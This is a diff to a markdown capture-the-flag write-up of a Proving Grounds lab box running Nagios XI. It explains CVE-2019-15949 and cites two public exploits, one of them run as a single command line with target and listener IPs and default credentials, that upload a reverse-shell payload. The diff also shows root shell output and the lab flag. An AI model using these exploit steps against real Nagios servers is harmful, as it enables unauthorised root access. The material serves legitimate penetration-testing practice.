@@ -103,15 +103,11 @@ root
 
 No privilege escalation was needed as the exploit already provided a root shell.
 
-### Underlying Vulnerability — CVE-2019-15949
+## Underlying Vulnerability — CVE-2019-15949
 
 The vulnerability exploited above is **CVE-2019-15949**: Nagios XI before 5.6.6 allows authenticated remote command execution as root. The `getprofile.sh` script, invoked by downloading a system profile via `profile.php?cmd=download`, is executed as root via a passwordless sudo entry. The script executes `check_plugin`, which is owned by the `nagios` user. An authenticated user with plugin management permissions can upload a malicious `check_plugin` file containing arbitrary commands, which are then executed as root when the profile is downloaded.
 
-### Alternative Exploitation Methods
-
-Several other public exploits target the same vulnerability. The following methods were identified from online write-ups and ExploitDB.
-
-#### Method 2 — Exploit 49422.py (EDB)
+## Alternative Exploitation Method — Exploit 49422.py (EDB)
 
 Exploit 49422 targets Nagios XI 5.7.X via the `monitoringplugins.php` file upload endpoint. It uploads a base64-encoded reverse shell payload and triggers execution through the same `profile.php?cmd=download` mechanism.
 
@@ -121,7 +117,7 @@ python3 49422.py http://192.168.239.136 nagiosadmin admin 192.168.45.198 4444
 
 Credit: [cyber_public_school — Monitoring Walkthrough (Proving Ground Play OSCP)](https://medium.com/@cyber_public_school/monitoring-walkthrough-proving-ground-play-oscp-6c8d637d649e)
 
-#### Method 3 — hadrian3689/nagiosxi_5.6.6 exploit.py (CVE-2019-15949)
+## Alternative Exploitation Method — hadrian3689/nagiosxi_5.6.6 exploit.py (CVE-2019-15949)
 
 A Python proof-of-concept for CVE-2019-15949 available at [hadrian3689/nagiosxi_5.6.6](https://github.com/hadrian3689/nagiosxi_5.6.6). It uploads a malicious plugin via the monitoringplugins.php endpoint and triggers execution through the profile download page.
 
@@ -138,7 +134,3 @@ root@lab-pg-ubuntu16-monitoring-244-189:/usr/local/nagiosxi/html/includes/compon
 root@lab-pg-ubuntu16-monitoring-244-189:~# cat proof.txt
 2d7f46c8a65952e766c8c3928305c969
 ```
-
-## TODO: Alternative exploitation methods
-
-Searched online for other write-ups of the Monitoring box. Two alternative methods were confirmed in published write-ups and have been added above (Methods 2 and 3). No privilege escalation methods were found — this box provides root directly via the initial RCE, so there are no alternative privilege escalation paths to document.
